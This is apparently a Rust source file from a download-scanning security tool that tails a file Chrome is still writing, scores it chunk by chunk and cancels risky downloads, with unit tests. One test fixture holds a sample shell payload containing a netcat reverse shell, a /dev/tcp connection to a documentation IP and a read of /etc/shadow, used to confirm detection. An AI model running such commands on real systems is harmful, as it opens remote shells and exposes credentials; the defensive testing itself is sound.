//! Incremental scanning of a download while Chrome is still writing it.
//!
//! This is the piece that makes "catch it before the download finishes" real.
//!
//! Chrome owns the fetch — it writes into a quarantine directory Aegis chose
//! via `downloads.onDeterminingFilename`. We tail that file from a byte offset
//! and feed each newly-arrived span through the scanner. If the running risk
//! score crosses the block threshold we say so immediately, and the extension
//! cancels the download mid-flight.
//!
//! Why tail a file Chrome owns rather than have the extension stream us bytes:
//! Chrome exposes no API for a download's byte stream, so the only way an
//! extension can supply the bytes is to fetch the URL a *second* time. That
//! doubles bandwidth and, worse, means the bytes scanned are not the bytes
//! delivered — a server can serve benign content to the scan and malicious
//! content to the browser. Letting Chrome do the single fetch and watching the
//! result keeps cookies, sessions, POST bodies and one-time tokens working too.
//!
//! Memory stays flat regardless of file size: we read at most `chunk_size`
//! bytes at a time and retain only a small trailing window for cross-boundary
//! pattern matching.

use anyhow::{Context, Result};
use std::path::{Path, PathBuf};
use std::time::{Duration, Instant};
use tokio::io::{AsyncReadExt, AsyncSeekExt};

use crate::config::Config;
use crate::risk;
use crate::scanner;

/// Bytes of the previous span kept so a pattern split across a read boundary
/// is still matched. Must exceed the longest signature in the scanner tables.
const TRAILING_CONTEXT_BYTES: usize = 512;

/// Outcome of watching a download to completion (or to an early kill).
#[derive(Debug, Clone)]
pub struct WatchOutcome {
    /// Highest aggregate risk observed across the whole file.
    pub risk_score: f32,
    /// Every distinct signal raised, in order first seen.
    pub descriptions: Vec<String>,
    /// Total bytes scanned.
    pub bytes_scanned: u64,
    /// Magic bytes identified the file type.
    pub header_valid: bool,
    /// Detected type contradicts the claimed extension.
    pub extension_mismatch: bool,
    /// Intent scanner flagged something.
    pub dangerous_intent: bool,
}

/// Where the download currently lives on disk.
///
/// Chrome writes to `<target>.crdownload` while in flight and renames to
/// `<target>` on completion, so both must be considered.
#[derive(Debug, Clone)]
pub struct WatchTarget {
    final_path: PathBuf,
    partial_path: PathBuf,
}

impl WatchTarget {
    pub fn new(final_path: impl Into<PathBuf>) -> Self {
        let final_path = final_path.into();
        let mut partial = final_path.clone().into_os_string();
        partial.push(".crdownload");
        Self {
            final_path,
            partial_path: PathBuf::from(partial),
        }
    }

    /// The path that currently exists on disk, if either does.
    fn current(&self) -> Option<&Path> {
        if self.partial_path.exists() {
            Some(&self.partial_path)
        } else if self.final_path.exists() {
            Some(&self.final_path)
        } else {
            None
        }
    }

    /// True once Chrome has renamed away the `.crdownload` file.
    fn looks_complete(&self) -> bool {
        !self.partial_path.exists() && self.final_path.exists()
    }
}

/// Incrementally scans a growing file.
pub struct DownloadWatcher {
    target: WatchTarget,
    filename: String,
    offset: u64,
    trailing: Vec<u8>,
    chunk_scores: Vec<f32>,
    descriptions: Vec<String>,
    is_first_span: bool,
    // Sticky: once any span raises a signal it stays raised for the session.
    header_valid: bool,
    extension_mismatch: bool,
    dangerous_intent: bool,
}

impl DownloadWatcher {
    pub fn new(target: WatchTarget, filename: impl Into<String>) -> Self {
        Self {
            target,
            filename: filename.into(),
            offset: 0,
            trailing: Vec::new(),
            chunk_scores: Vec::new(),
            descriptions: Vec::new(),
            is_first_span: true,
            header_valid: false,
            extension_mismatch: false,
            dangerous_intent: false,
        }
    }

    /// Current aggregate risk across everything scanned so far.
    pub fn current_risk(&self) -> f32 {
        risk::aggregate_risk(&self.chunk_scores)
    }

    pub fn bytes_scanned(&self) -> u64 {
        self.offset
    }

    pub fn descriptions(&self) -> &[String] {
        &self.descriptions
    }
}

/// Windows `ERROR_VIRUS_INFECTED`. Returned by the filesystem when another
/// security product (typically Defender real-time protection) has already
/// quarantined the file we are trying to open.
#[cfg(windows)]
const ERROR_VIRUS_INFECTED: i32 = 225;

/// `ERROR_SHARING_VIOLATION` — another process (Chrome, writing the download)
/// holds the file with a share mode that excludes us right now.
#[cfg(windows)]
const ERROR_SHARING_VIOLATION: i32 = 32;

/// `ERROR_LOCK_VIOLATION` — a byte-range lock is held on the region.
#[cfg(windows)]
const ERROR_LOCK_VIOLATION: i32 = 33;

/// Is this error transient — i.e. "the writer is busy, try again shortly" —
/// rather than a real failure?
///
/// This matters enormously in the real deployment: Chrome has the `.crdownload`
/// file open for writing for the entire duration of the download. Treating a
/// momentary sharing violation as fatal takes down the host, which disconnects
/// the native port, which makes the extension fail closed and cancel a
/// perfectly good download. The symptom is "nothing can be downloaded at all",
/// with the cause several layers away from where it surfaces.
fn is_transient_io(e: &std::io::Error) -> bool {
    if e.kind() == std::io::ErrorKind::NotFound
        || e.kind() == std::io::ErrorKind::PermissionDenied
        || e.kind() == std::io::ErrorKind::Interrupted
    {
        return true;
    }
    #[cfg(windows)]
    {
        matches!(
            e.raw_os_error(),
            Some(ERROR_SHARING_VIOLATION) | Some(ERROR_LOCK_VIOLATION)
        )
    }
    #[cfg(not(windows))]
    {
        false
    }
}

/// Result of one scanning pass.
enum ScanStep {
    /// Bytes newly scanned this pass (0 is normal — the writer may be slow).
    Scanned(u64),
    /// Another AV product removed the file out from under us.
    ExternallyQuarantined(String),
}

impl DownloadWatcher {
    /// Read and scan whatever has arrived since the last call.
    async fn scan_new_bytes(&mut self, cfg: &Config) -> Result<ScanStep> {
        let Some(path) = self.target.current() else {
            // Not created yet. Chrome may still be resolving the filename.
            return Ok(ScanStep::Scanned(0));
        };
        let path = path.to_path_buf();

        let mut file = match tokio::fs::File::open(&path).await {
            Ok(f) => f,
            // Defender (or another AV) got there first. This is a BLOCK, not an
            // error: the file is gone and the user is protected. It happens for
            // signature-known malware, where the on-write scanner beats us to
            // it. Aegis's value is the unknown-sample and pre-completion cases,
            // not racing a kernel minifilter.
            #[cfg(windows)]
            Err(e) if e.raw_os_error() == Some(ERROR_VIRUS_INFECTED) => {
                return Ok(ScanStep::ExternallyQuarantined(format!(
                    "another security product (likely Windows Defender) quarantined \
                     {} before Aegis could scan it",
                    path.display()
                )));
            }
            // Chrome still has the file open, or a rename raced us between
            // exists() and open(). Wait and retry — NOT fatal.
            Err(ref e) if is_transient_io(e) => {
                tracing::trace!(
                    path = %path.display(),
                    error = %e,
                    "transient IO while opening download; will retry"
                );
                return Ok(ScanStep::Scanned(0));
            }
            Err(e) => {
                return Err(e).with_context(|| format!("open quarantine file {}", path.display()))
            }
        };

        let len = match file.metadata().await {
            Ok(m) => m.len(),
            Err(ref e) if is_transient_io(e) => return Ok(ScanStep::Scanned(0)),
            Err(e) => {
                return Err(e).with_context(|| format!("stat quarantine file {}", path.display()))
            }
        };

        if len <= self.offset {
            return Ok(ScanStep::Scanned(0));
        }

        file.seek(std::io::SeekFrom::Start(self.offset))
            .await
            .context("seek to last scanned offset")?;

        let mut scanned = 0u64;
        let mut buf = vec![0u8; cfg.chunking.chunk_size];

        while self.offset < len {
            let want = std::cmp::min(cfg.chunking.chunk_size as u64, len - self.offset) as usize;
            let n = match file.read(&mut buf[..want]).await {
                Ok(n) => n,
                // Partial write in progress — come back for it next pass.
                Err(ref e) if is_transient_io(e) => break,
                Err(e) => return Err(e).context("read span from quarantine file"),
            };
            if n == 0 {
                break; // writer hasn't flushed yet
            }
            let span = &buf[..n];

            // Cross-boundary context: prepend the tail of the previous span so
            // a signature straddling the seam is still found.
            let context = if self.trailing.is_empty() {
                None
            } else {
                Some(self.trailing.as_slice())
            };

            let result =
                scanner::deep_forensic_scan(span, &self.filename, self.is_first_span, context)
                    .await?;

            self.chunk_scores.push(result.risk_score);
            // Sticky OR: a signal raised by any span holds for the session.
            // The first span sets header_valid; later spans must not clear it.
            self.header_valid |= result.header_valid;
            self.extension_mismatch |= result.extension_mismatch;
            self.dangerous_intent |= result.dangerous_intent;
            for d in result.descriptions {
                if !self.descriptions.contains(&d) {
                    self.descriptions.push(d);
                }
            }

            // Retain only a bounded tail — this is what keeps memory flat.
            let keep = std::cmp::min(TRAILING_CONTEXT_BYTES, span.len());
            self.trailing.clear();
            self.trailing.extend_from_slice(&span[span.len() - keep..]);

            self.is_first_span = false;
            self.offset += n as u64;
            scanned += n as u64;
        }

        Ok(ScanStep::Scanned(scanned))
    }
}

/// Signals the caller can act on while a download is in flight.
pub enum WatchEvent {
    /// Risk crossed the block threshold — cancel the download now.
    EarlyBlock { risk_score: f32, reason: String },
    /// Download finished and was scanned to the end.
    Completed(Box<WatchOutcome>),
}

/// Watch a download to completion, or until it must be killed.
///
/// `is_cancelled` lets the caller stop the loop (e.g. the user cancelled the
/// download in Chrome). `on_progress` is invoked after each scanning pass.
pub async fn watch_download<F>(
    watcher: &mut DownloadWatcher,
    cfg: &Config,
    mut on_progress: F,
) -> Result<WatchEvent>
where
    F: FnMut(u64, f32),
{
    let started = Instant::now();
    let total_timeout = cfg.chunking.total_transfer_timeout();
    let poll_interval = Duration::from_millis(100);
    let mut last_growth = Instant::now();
    let per_chunk_timeout = cfg.chunking.per_chunk_timeout();

    loop {
        let new_bytes = match watcher.scan_new_bytes(cfg).await? {
            ScanStep::Scanned(n) => n,
            ScanStep::ExternallyQuarantined(detail) => {
                // Report as a block, not an error. The outcome the user cares
                // about — "this file did not reach me" — already happened.
                return Ok(WatchEvent::EarlyBlock {
                    risk_score: 1.0,
                    reason: format!("Blocked by another security product: {detail}"),
                });
            }
        };

        if new_bytes > 0 {
            last_growth = Instant::now();
            on_progress(watcher.bytes_scanned(), watcher.current_risk());

            // Enforce the size ceiling continuously, not just up front.
            if watcher.bytes_scanned() > cfg.chunking.max_download_bytes {
                return Ok(WatchEvent::EarlyBlock {
                    risk_score: watcher.current_risk(),
                    reason: format!(
                        "Download exceeded maximum allowed size ({} bytes > {} limit)",
                        watcher.bytes_scanned(),
                        cfg.chunking.max_download_bytes
                    ),
                });
            }

            // The whole point: kill it before it finishes arriving.
            let score = watcher.current_risk();
            if score >= cfg.risk.block_threshold {
                return Ok(WatchEvent::EarlyBlock {
                    risk_score: score,
                    reason: format!(
                        "Risk score {:.2} crossed block threshold {:.2} after {} bytes. Signals: {}",
                        score,
                        cfg.risk.block_threshold,
                        watcher.bytes_scanned(),
                        watcher.descriptions().join("; ")
                    ),
                });
            }
        }

        if watcher.target.looks_complete() {
            // Final sweep: the rename may have landed between our last read and
            // the completion check, so drain whatever is left before verdicting.
            if let ScanStep::ExternallyQuarantined(detail) = watcher.scan_new_bytes(cfg).await? {
                return Ok(WatchEvent::EarlyBlock {
                    risk_score: 1.0,
                    reason: format!("Blocked by another security product: {detail}"),
                });
            }
            return Ok(WatchEvent::Completed(Box::new(WatchOutcome {
                risk_score: watcher.current_risk(),
                descriptions: watcher.descriptions().to_vec(),
                bytes_scanned: watcher.bytes_scanned(),
                header_valid: watcher.header_valid,
                extension_mismatch: watcher.extension_mismatch,
                dangerous_intent: watcher.dangerous_intent,
            })));
        }

        // FAIL CLOSED on stalls. A slow-loris download must not hold a
        // quarantine slot (and its disk space) open indefinitely.
        if last_growth.elapsed() > per_chunk_timeout {
            return Ok(WatchEvent::EarlyBlock {
                risk_score: watcher.current_risk(),
                reason: format!(
                    "Download stalled: no new bytes for {}s",
                    per_chunk_timeout.as_secs()
                ),
            });
        }
        if started.elapsed() > total_timeout {
            return Ok(WatchEvent::EarlyBlock {
                risk_score: watcher.current_risk(),
                reason: format!(
                    "Download exceeded total transfer timeout of {}s",
                    total_timeout.as_secs()
                ),
            });
        }

        tokio::time::sleep(poll_interval).await;
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn watch_target_prefers_crdownload_while_in_flight() {
        let dir = tempfile::tempdir().expect("tempdir");
        let final_path = dir.path().join("file.aegispart");
        let target = WatchTarget::new(&final_path);

        assert!(target.current().is_none(), "nothing on disk yet");
        assert!(!target.looks_complete());

        std::fs::write(dir.path().join("file.aegispart.crdownload"), b"partial").unwrap();
        assert_eq!(target.current(), Some(target.partial_path.as_path()));
        assert!(!target.looks_complete(), "still in flight");

        std::fs::remove_file(dir.path().join("file.aegispart.crdownload")).unwrap();
        std::fs::write(&final_path, b"done").unwrap();
        assert_eq!(target.current(), Some(final_path.as_path()));
        assert!(target.looks_complete(), "rename observed");
    }

    /// A file that only ever exists as .crdownload must never look complete —
    /// otherwise an interrupted download would be verdicted as a whole file.
    #[test]
    fn partial_only_never_looks_complete() {
        let dir = tempfile::tempdir().expect("tempdir");
        let final_path = dir.path().join("x.aegispart");
        let target = WatchTarget::new(&final_path);
        std::fs::write(dir.path().join("x.aegispart.crdownload"), b"abc").unwrap();
        assert!(!target.looks_complete());
    }

    fn test_config() -> Config {
        use crate::config::*;
        Config {
            host: HostConfig { log_level: "debug".into() },
            ml: MlConfig { service_url: "http://127.0.0.1:8787/score".into(), timeout_ms: 500 },
            risk: RiskConfig { sandbox_threshold: 0.4, block_threshold: 0.85 },
            chunking: ChunkingConfig {
                chunk_size: 4096,
                ring_buffer_chunks: 4,
                per_chunk_timeout_secs: 2,
                total_transfer_timeout_secs: 10,
                max_download_bytes: 8_589_934_592,
                max_whole_file_scan_bytes: 67_108_864,
            },
            sandbox: SandboxConfig {
                detonation_timeout_secs: 5,
                max_detonation_size: 262_144_000,
            },
            quarantine: QuarantineConfig {
                subdir: "aegis-quarantine".into(),
                keep_flagged_samples: false,
            },
        }
    }

    /// THE core Phase 2 claim: malware is caught while the download is still in
    /// flight, not after it lands. The file here exists ONLY as `.crdownload`,
    /// i.e. Chrome is still writing it — and the watcher must still kill it.
    #[tokio::test]
    async fn malicious_content_is_caught_mid_download() {
        let dir = tempfile::tempdir().unwrap();
        let final_path = dir.path().join("payload.aegispart");

        // Deliberately NOT EICAR. Windows Defender quarantines EICAR on write,
        // so a test using it fails with os error 225 ("file contains a virus")
        // when the watcher tries to open it — measuring Defender, not Aegis.
        // These are real high-risk signatures from the intent table instead:
        // nc reverse shell (0.8) + /etc/shadow (0.7) + /dev/tcp (0.7), which
        // saturate the intent score well above block_threshold.
        let payload = b"#!/bin/sh\n\
                        nc -e /bin/sh 203.0.113.7 4444\n\
                        cat /etc/shadow\n\
                        exec 3<>/dev/tcp/203.0.113.7/9001\n";
        // Only the in-flight name exists. The download has NOT completed.
        std::fs::write(dir.path().join("payload.aegispart.crdownload"), payload).unwrap();

        let cfg = test_config();
        let mut w = DownloadWatcher::new(WatchTarget::new(&final_path), "invoice.pdf");
        let event = watch_download(&mut w, &cfg, |_, _| {}).await.unwrap();

        match event {
            WatchEvent::EarlyBlock { risk_score, reason } => {
                assert!(
                    risk_score >= cfg.risk.block_threshold,
                    "early block fired at {risk_score}, below threshold"
                );
                assert!(
                    reason.contains("block threshold"),
                    "unhelpful block reason: {reason}"
                );
            }
            WatchEvent::Completed(o) => panic!(
                "malicious file was NOT caught mid-download — completed with risk {:.2}. \
                 The early-kill path has regressed.",
                o.risk_score
            ),
        }
        assert!(
            !final_path.exists(),
            "the download must never have been allowed to complete"
        );
    }

    /// A benign file that finishes downloading should complete with low risk.
    #[tokio::test]
    async fn benign_completed_download_scores_low() {
        let dir = tempfile::tempdir().unwrap();
        let final_path = dir.path().join("photo.aegispart");
        let mut png = b"\x89PNG\r\n\x1a\n".to_vec();
        png.extend(std::iter::repeat_n(0u8, 4096));
        // No .crdownload -> Chrome has renamed, i.e. the download is done.
        std::fs::write(&final_path, &png).unwrap();

        let cfg = test_config();
        let mut w = DownloadWatcher::new(WatchTarget::new(&final_path), "photo.png");
        let event = watch_download(&mut w, &cfg, |_, _| {}).await.unwrap();

        match event {
            WatchEvent::Completed(o) => {
                assert_eq!(o.bytes_scanned, png.len() as u64, "whole file must be scanned");
                assert!(
                    o.risk_score < cfg.risk.sandbox_threshold,
                    "benign PNG scored {:.2}, above the sandbox threshold",
                    o.risk_score
                );
            }
            WatchEvent::EarlyBlock { reason, .. } => {
                panic!("benign PNG was blocked: {reason}")
            }
        }
    }

    /// A stalled download must not hold a quarantine slot open forever.
    /// FAIL CLOSED — a slow-loris transfer is blocked, not waited on.
    #[tokio::test]
    async fn stalled_download_is_blocked_not_waited_on() {
        let dir = tempfile::tempdir().unwrap();
        let final_path = dir.path().join("slow.aegispart");
        // Exists as in-flight, never grows, never completes.
        std::fs::write(dir.path().join("slow.aegispart.crdownload"), b"just a little").unwrap();

        let mut cfg = test_config();
        cfg.chunking.per_chunk_timeout_secs = 1;

        let mut w = DownloadWatcher::new(WatchTarget::new(&final_path), "slow.bin");
        let event = watch_download(&mut w, &cfg, |_, _| {}).await.unwrap();

        match event {
            WatchEvent::EarlyBlock { reason, .. } => {
                assert!(reason.contains("stalled"), "unexpected block reason: {reason}");
            }
            WatchEvent::Completed(_) => panic!("a stalled download must not be completed"),
        }
    }

    /// Chrome holds the `.crdownload` file open for the whole download. If that
    /// makes our open fail and we treat it as fatal, the error propagates out of
    /// `watch_download`, ends `run()`, exits the host, drops the native port —
    /// and the extension correctly reads a dropped port as "cannot verify" and
    /// cancels the download. The visible symptom is "nothing downloads at all",
    /// several layers from the cause.
    ///
    /// So: a locked file must NEVER produce an `Err` from `watch_download`.
    #[cfg(windows)]
    #[tokio::test]
    async fn exclusive_lock_does_not_kill_the_watcher() {
        use std::os::windows::fs::OpenOptionsExt;

        let dir = tempfile::tempdir().unwrap();
        let final_path = dir.path().join("locked.aegispart");
        let partial = dir.path().join("locked.aegispart.crdownload");
        std::fs::write(&partial, b"some downloaded bytes").unwrap();

        // share_mode(0) == no sharing at all: any other open fails with
        // ERROR_SHARING_VIOLATION (32). This is the worst case Chrome could
        // present us with.
        let _held = std::fs::OpenOptions::new()
            .read(true)
            .share_mode(0)
            .open(&partial)
            .expect("take exclusive lock");

        let mut cfg = test_config();
        cfg.chunking.per_chunk_timeout_secs = 1;

        let mut w = DownloadWatcher::new(WatchTarget::new(&final_path), "doc.pdf");
        let result = watch_download(&mut w, &cfg, |_, _| {}).await;

        let event = result.expect(
            "a locked download file must not produce an Err — that kills the host \
             and makes every download fail",
        );
        match event {
            // Correct: we waited, could not read, and gave up safely.
            WatchEvent::EarlyBlock { reason, .. } => {
                assert!(reason.contains("stalled"), "unexpected reason: {reason}");
            }
            WatchEvent::Completed(_) => {
                panic!("an unreadable file must not be reported as successfully scanned")
            }
        }
    }

    /// Memory must stay flat regardless of file size: the watcher retains only
    /// a bounded trailing window, never the file.
    #[tokio::test]
    async fn trailing_context_stays_bounded() {
        let dir = tempfile::tempdir().unwrap();
        let final_path = dir.path().join("big.aegispart");
        std::fs::write(&final_path, vec![b'A'; 200_000]).unwrap();

        let cfg = test_config();
        let mut w = DownloadWatcher::new(WatchTarget::new(&final_path), "big.bin");
        let _ = watch_download(&mut w, &cfg, |_, _| {}).await.unwrap();

        assert!(
            w.trailing.len() <= TRAILING_CONTEXT_BYTES,
            "trailing window grew to {} bytes — memory is not bounded",
            w.trailing.len()
        );
        assert_eq!(w.bytes_scanned(), 200_000, "whole file should still be scanned");
    }
}
